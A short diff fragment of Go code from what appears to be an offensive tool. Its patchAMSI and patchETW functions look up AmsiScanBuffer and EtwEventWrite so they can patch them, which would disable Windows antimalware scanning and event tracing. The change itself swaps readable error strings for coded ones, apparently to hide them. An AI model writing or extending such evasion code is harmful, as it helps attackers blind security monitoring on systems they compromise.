@@ -31,7 +31,7 @@ func patchAMSI() error {
 	amsiScanBuffer := amsi.NewProc("AmsiScanBuffer")
 
 	if amsiScanBuffer.Addr() == 0 {
-		return fmt.Errorf("AmsiScanBuffer not found")
+		return fmt.Errorf(Err(E4))
 	}
 
 	var patch []byte
@@ -50,7 +50,7 @@ func patchETW() error {
 	etwEventWrite := ntdll.NewProc("EtwEventWrite")
 
 	if etwEventWrite.Addr() == 0 {
-		return fmt.Errorf("EtwEventWrite not found")
+		return fmt.Errorf(Err(E4))
 	}
 
 	var patch []byte
